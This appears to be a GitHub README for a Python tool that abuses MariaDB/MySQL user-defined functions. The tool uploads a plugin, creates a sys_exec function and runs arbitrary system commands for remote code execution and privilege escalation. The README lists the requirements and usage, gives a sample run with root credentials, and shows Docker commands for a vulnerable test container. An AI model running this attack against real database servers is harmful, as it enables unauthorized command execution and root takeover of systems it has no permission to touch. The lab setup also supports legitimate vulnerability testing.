# MariaDB-UDF-remote-sys-exec
MariaDB / MySQL Remote User-Defind function (sys_exec) for remote code execution and privilege escalation

Requirements:
- File write access to the plugins folder
- create a udf function in mysql

The script does the follwing
- Uploads the so plugin
- Creates a udf function
- runs the provided command, keep in mind you will ony get a return code (0 means ok) and no output

Based on this lpe exploit: https://www.exploit-db.com/exploits/50236




```bash
usage: create_udf.py [-h] --user USER [--password PASSWORD] --host HOST [--port PORT] [--cmd CMD]

options:
  -h, --help            show this help message and exit
  --user USER, -u USER  MySQL username
  --password PASSWORD, -p PASSWORD
                        MySQL password
  --host HOST, -H HOST  MySQL Server
  --port PORT, -P PORT  MySQL Port
  --cmd CMD, -c CMD     Command

```

>keep in mind to escape `'` in your command to avoid sql injections


```bash
python3 create_udf.py --host 192.168.1.1 --user root --password mypass --port 3308 --cmd "bash -c \'ping -c 5 192.168.1.2\'"
```


## Start a vulnerable Docker Container

to test if a specific mysql or mariadb is vulnerable you can spawn a docker container, example for maraidb_10.3.20:


```bash
docker run --name=cve --rm -v $(pwd)/mysql/:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=mypass -p 3308:3306 mariadb:10.3.20
docker stop cve
docker run --name=cve --rm -v $(pwd)/mysql/:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=mypass -p 3308:3306 --entrypoint mysqld mariadb:10.3.20 --user=root
```

we need to do this in two steps to get it running as root [Why](https://stackoverflow.com/questions/44592222/how-do-i-run-mysqld-as-root-in-the-official-mysql-docker-image)